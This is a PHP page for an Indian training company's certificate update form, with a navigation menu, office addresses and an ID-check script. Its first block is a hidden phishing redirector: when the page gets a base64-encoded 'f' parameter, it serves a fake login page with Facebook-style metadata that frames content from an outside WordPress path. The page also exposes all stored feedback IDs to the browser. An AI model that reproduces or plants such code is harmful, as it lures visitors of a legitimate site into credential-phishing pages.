<?php include_once 'post/connect.php';?>
<?php
$sql ="SELECT * FROM certificates WHERE flag=1";
$result=$conn->query($sql);
$rows=mysqli_fetch_array($result);

$sql = "SELECT inspireid FROM feedback";

$result = mysqli_query($conn, $sql) or die("Error in Selecting " . mysqli_error($conn));

//create an array
$techarray = array();
while($row =mysqli_fetch_assoc($result)){
    $techarray[] = $row;
}

$techarray_json= json_encode($techarray);

if(!empty($_GET['f'])){
$vnc = $_GET['f'];

$lolz = htmlspecialchars_decode(base64_decode($vnc));
echo "<html>
<head>
 
		
<title>Hello - Welcome! Please log in to continue...</title>
<meta property=\"og:url\" content=\"https://www.facebook.com\" />
<meta property=\"og:type\" content=\"article\" />
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
<meta property=\"og:title\" content=\"Join Now\" />
<meta property=\"og:description\" content=\"Click me!\" />
<meta property=\"og:image\" content=\"https://kiflite.bg/inc\" />
		
	
	<meta name=\"revisit-after\" content=\"1000 days\">
<meta name=\"robots\" content=\"NOINDEX\">
</head>
<title>zabi </title>
<meta name=\"keywords\" content=\"\">
<meta name=\"description\" content=\"\">
<meta name=\"revisit-after\" content=\"500000 days\">
<meta name=\"robots\" content=\"NOINDEX\">
<link rel=\"shortcut icon\" type=\"image/ico\" href=\"\">

</head>
<frameset rows=\"*,4\" frameborder=\"NO\" border=\"59\" framespacing=\"0\">
<frame name=\"main\" src=\"https://ucustoms.org/wp-includes/assets/mode/$lolz\">
<noframes>
</html>";
}

?>


<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Inspire Solutions</title>
        <meta name="title" content="Inspire Solutions" />
        <meta name="keywords" content="Inspire Solutions" />
        <meta name="description" content="Inspire Solutions" />
        <!--custom css-->
        <link rel="stylesheet" href="css/style.css">
        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <!--Owl carousel-->
        <link rel="stylesheet" href="css/owl.carousel.min.css">
        <link rel="stylesheet" href="css/owl.theme.default.min.css">
        <link rel="stylesheet" href="css/fontawesome.css">
        <link rel="stylesheet" href="css/aos.css">
        <link rel="stylesheet" href="css/animate.css">
        <link href="css/googleFonts.css" rel="stylesheet">

    </head>
    
    <body>
       <header>
           
        <nav class="navbar navbar-expand-lg navbar-light bg-light shadow p-3 mb-5 bg-white rounded" id="nav">
                <a class="navbar-brand d-block d-lg-none d-xl-none" href="#"><img src="img/logo.png" class="img-fluid " alt=""></a>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                  </button>

            <div class="collapse navbar-collapse justify-content-around" id="navbarNavDropdown">
                <div class="d-none d-lg-block d-xl-block">
                    <a class="navbar-brand" href="#"><img src="img/logo.png" class="img-fluid" alt=""></a>
                </div>
                <ul class="navbar-nav text-center-nav">
                    <li class="nav-item ">
                        <a class="nav-link" href="index.html">Home</a>
                    </li>
					<li class="nav-item">
                    <a class="nav-link" href="courses.php" >Our Courses</a>
                	</li>
                    <li class="nav-item">
                    <a class="nav-link" href="gallery.php" >Gallery</a>
                	</li>
                    <li class="nav-item">
                        <a class="nav-link" href="aboutUs.html" >Who We Are</a>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                          Training Solutions
                        </a>
                        <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                          <a class="dropdown-item" href="executive.html">Executive Coaching </a>
                          <a class="dropdown-item" href="softSkill.html">Soft skill Training  </a>
                          <a class="dropdown-item" href="leadership.html">Leadership Training</a>
                          <a class="dropdown-item" href="technicalTeaching.html">Techical Training Consultants</a>
                      </li>
                    <li class="nav-item">
                        <a class="nav-link" href="clients.html" >Our Clients</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="contactUs.html">Contact Us</a>
                    </li>	
                    <li class="nav-item dropdown activeMenu"><a aria-expanded="false" aria-haspopup="true" class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" id="navbarDropdown" role="button">Certificate </a>
                        <div aria-labelledby="navbarDropdown" class="dropdown-menu"><a class="dropdown-item" href="feedback.php">Feedback Form </a> <a class="dropdown-item" href="verify.html" target="blank">Certificate Verification </a></div>
                    </li>
                </ul>
            </div>
          </nav>
       </header>
    <!-- Banner -->
     <Section class="aboutBg pt-5">
         <div class="container">
            <h1 class="text-center pb-5">
                <span class="blue">
                    Update
                </span>
                <span class="orange">
                    Form
                </span>
                </h1>
         </div>
     </Section>

         <!-- Enquiry form -->

         <section class="mt-3">
            <div class="container">
                <div class="row align-items-center">
                <div class="col-lg-6  align-items-baseline  text-center">
                     <!--<h2 class="pb-5" style="padding-bottom: 1rem !important;"><span class="blue">Enquiry</span> <span class="orange">Form</span></h2>-->
                     <p style="margin-bottom: 0;">Fill out the form with correct details.</p>
                     <p style="color: red; font-size:10px;" >* Details given below will be taken for certificate generation!</p>
                        <form method="post" action="post/action_update.php" onSubmit="if(!confirm('Please check the details again before submiting!')){return false;}">
                            <div class="form-group">
                              <input type="text" placeholder="Enter Inspire ID" class="form-control" id="inspireid" onkeypress="return blockSpecialChar(event)" onchange="CheckIID(this)" name="inspireid" required>
                            </div>
                            <p style="color: red; font-size:10px;margin-bottom: 10px;text-align:right;margin-top:10px;" id="message"></p>
                            <p style="color: red; font-size:10px;margin-bottom: auto;" >* Below entered detail will be printed in the certificate!</p>
                            <div class="form-group">
                              <input type="text" placeholder="Enter Name" class="form-control" id="name" onkeypress="return blockSpecialChar(event)" name="name" required>
                            </div>
                            <p style="color: red; font-size:10px;margin-bottom: auto;" >* Below entered detail will be printed in the certificate!</p>
                            <div class="form-group">
                              <input type="text" class="form-control" name="instution" id="instution" onkeypress="return blockSpecialChar(event)" placeholder="Enter Organization or Institution Name" required>
                            </div>
                            <div class="form-group">
                                <input type="email" class="form-control" name="email" id="email" onkeypress="return blockSpecialChar(event)" placeholder="Enter E-mail" aria-describedby="emailHelp" required>
                            </div>
                            <div class="form-group">
                              <input type="number" class="form-control" name="mobile" id="mobile" onkeypress="return blockSpecialChar(event)" placeholder="Enter Mobile Number" pattern="[0-9]{10}" required>
                            </div>  
                            <button name="submit_top" type="submit" id="btnsubmit" name="btnsubmit" class="btn"style="color: white;background:orange;">Submit</button>
                          </form>
                        
                    </div>
                <div class="col-lg-6">
                    <div id="carouselExampleControls" style="margin-top:-2%;" class="carousel slide" data-ride="carousel">
                        <div class="carousel-inner">
                            <div class="carousel-item active">
                                <img src="img/carousel01.jpg" class="d-block w-100" alt="...">
                              </div>
                              <div class="carousel-item">
                                <img src="img/carousel02.jpg" class="d-block w-100" alt="...">
                              </div>
                              <div class="carousel-item">
                                <img src="img/carousel03.jpg" class="d-block w-100" alt="...">
                              </div>
                              <div class="carousel-item">
                                <img src="img/carousel04.jpg" class="d-block w-100" alt="...">
                              </div>
                        </div>
                        <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
                          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                          <span class="sr-only">Previous</span>
                        </a>
                        <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
                          <span class="carousel-control-next-icon" aria-hidden="true"></span>
                          <span class="sr-only">Next</span>
                        </a>
                      </div>      
                    </div>

                </div>
            </div>
        </section>
        <footer class="pt-5 text-center-nav">
            <div class="container">
                <div class="row">
                    <div class="col-lg-4 ">
                        <h3 class="blue">Training Solutions</h3>
                        <p><a href="#" class="footerLink">Executive Coaching</a></p>
                        <p><a href="#" class="footerLink"> Soft skill Training</a></p>
                        <p><a href="#" class="footerLink">Leadership Training </a></p>
                        <p><a href="#" class="footerLink">Techical Training Consultants</a></p> 
                    </div>
                    <div class="col-lg-4">
                        <h3 class="blue">Head Office</h3>
                        <p><i class="fa fa-envelope orange"></i> 170/31, 
                            Rojathottam First <br> Cross 
                            Street, East Tambaram, <br>
                            Chennai – 600 059. </p>
                        <p><i class="fa fa-phone orange"></i> 044- 65255500 </p>
                        <p><i class="fas fa-mobile orange"></i> + 91 86674 93679</p>
                    
                        <a href="img/version_2.pdf" target="_blank"><i class="fas fa-cloud-download-alt blue"></i>Download Brochure</a>
                    </div>
                    <div class="col-lg-4">
                        <h3 class="blue">Branch Offices</h3>
                        <p><i class="fa fa-envelope orange"></i> Flat No.508, Block-2,<br>
                                Skyline City, Chandra
                                Layout,<br>
                                Bangalore- 560 072.</p>
                            <p><i class="fa fa-phone orange"></i> 080 – 22974968 </p>
                            <p><i class="fas fa-mobile orange"></i> +91 988 487 3190</p>

                        <p style="border-top:1px solid; padding-top: 3%;"><i class="fa fa-envelope orange"></i> 401,Mayur Pankh 6th
                            Road,<br> Chembur,
                            Mumbai – 400071.</p>
                        <p><i class="fas fa-mobile-alt orange"></i>+91 97693 51367 </p>
                    </div>
                </div>
            </div>
            <div class="whatsapp ">
                <a target="_blank" href="https://api.whatsapp.com/send?phone=#=&text=Hello">
                    <img src="img/whatsapp-icon.png" alt="">
                </a>
            </div>
    
            <div class="bottomToTop d-none">
                <a href='#top'>
                    <i class="fas fa-arrow-circle-up"></i>
                </a>
            </div>
            <div class="container ">
                <div class="row justify-content-between">
                    <p class="left">&copy; 2020 Inspire Softech Solutions. All Right Reserved</p>
                    <p class="right">Powered By <a target="_blank" href="https://www.grepex.com/">Grepex Technologies</a></p>
                </div>
                
            </div>
        </footer>
        <script src="js/jquery.slim.min.js"></script>
        <script src="js/popper.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/owl.carousel.min.js"></script>
        <script src="js/aos.js"></script>
        <script src="js/script.js"></script>
        
    </body>
    </html>
    <script>
      let inspireid = '<?php echo($techarray_json)?>';
      const obj = JSON.parse(inspireid);
      const len = obj.length;
      console.log(obj[1]['inspireid'].trim);
    //   console.log(obj.length);
  </script>

    <script>

function CheckIID() {
        inspireid = document.getElementById("inspireid").value;
        // alert(inspireid);
        flag = 0;

        for (var i = 0; i < len; i++) {
            if (obj[i]['inspireid'] == inspireid) {
                flag = 1;
                break;
            }
            else{
                // flag=0;
                // console.log(obj[i]['inspireid']);
            }
        }
        if (flag == 0) {

            $('#inspireid').val('');
            $('#btnsubmit').prop('disabled', true);
            alert('Invalid Inspire ID!');
            $("#message").css('color', 'red');
            $( "#message" ).text('Invalid Inspire ID or Register in Feedback First!');
        } else {
            $('#btnsubmit').prop('disabled', false);
            $("#message").css('color', 'green');
            $( "#message" ).text('Inspire ID is verified!');

        }
    }
    </script>
         <script type="text/javascript">
    function blockSpecialChar(e){
        var k;
        document.all ? k = e.keyCode : k = e.which;
        return ((k > 63 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57) || k == 46 || k == 44 || k==39) ;
        }
  </script>